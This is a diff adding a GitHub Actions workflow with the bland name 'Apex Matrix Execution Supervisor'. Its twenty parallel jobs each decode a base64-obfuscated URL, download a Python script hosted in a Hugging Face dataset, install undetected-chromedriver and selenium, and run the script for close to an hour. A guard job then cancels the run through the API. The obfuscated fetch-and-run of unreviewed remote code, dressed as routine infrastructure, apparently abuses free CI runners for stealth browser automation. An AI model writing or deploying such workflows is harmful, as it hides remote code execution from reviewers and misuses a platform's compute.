@@ -1,0 +1,95 @@
+name: Apex Matrix Execution Supervisor
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: apex-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Module A: Automated Timeout Dispatcher
+  # =================================================================
+  timeout-guard:
+    name: "Guard Agent"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      HOLD_TIME: 3540
+    steps:
+      - name: Activate Guard Protocol
+        run: |
+          echo ">> Guard protocol active. Target workflow run: ${{ github.run_id }}"
+          echo ">> Enforcing hold period for ${HOLD_TIME} seconds."
+
+          sleep "${HOLD_TIME}"
+
+          echo ">> Limit achieved — invoking API cancellation."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo ">> API cancellation request transmitted."
+
+  # =================================================================
+  # Module B: Distributed Processing Nodes
+  # =================================================================
+  processing-nodes:
+    name: "Node-${{ matrix.cluster_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        cluster_id: ["NODE-A01", "NODE-A02", "NODE-A03", "NODE-A04", "NODE-A05", "NODE-B01", "NODE-B02", "NODE-B03", "NODE-B04", "NODE-B05", "NODE-C01", "NODE-C02", "NODE-C03", "NODE-C04", "NODE-C05", "NODE-D01", "NODE-D02", "NODE-D03", "NODE-D04", "NODE-D05"]
+
+    steps:
+      # Step 1: Base Linux Dependencies
+      - name: Provision Host Requirements
+        run: |
+          echo "[1/4] Installing system dependencies for Node-${{ matrix.cluster_id }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # Step 2: Extract Remote Python Script
+      - name: Fetch Executable Script
+        run: |
+          echo "[2/4] Downloading core script from remote..."
+          TARGET_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$TARGET_URL" -o main_service.py
+          echo "[2/4] main_service.py created."
+
+      # Step 3: PyPI Package Setup
+      - name: Setup Python Packages
+        run: |
+          echo "[3/4] Installing Python requirements..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # Step 4: Background Execution Loop
+      - name: Launch Target Service
+        run: |
+          echo "[4/4] Executing main_service.py on Node-${{ matrix.cluster_id }}..."
+
+          python3 main_service.py &
+          SERVICE_PID=$!
+
+          echo "[4/4] Service spawned (PID: $SERVICE_PID). Waiting 3540 seconds..."
+
+          sleep 3540
+
+          if kill -0 "$SERVICE_PID" 2>/dev/null; then
+            echo "[4/4] Lifespan limit exceeded — stopping process $SERVICE_PID."
+            kill -9 "$SERVICE_PID"
+            echo "[4/4] Process terminated."
+          else
+            echo "[4/4] Process finished successfully within timeframe."
+          fi
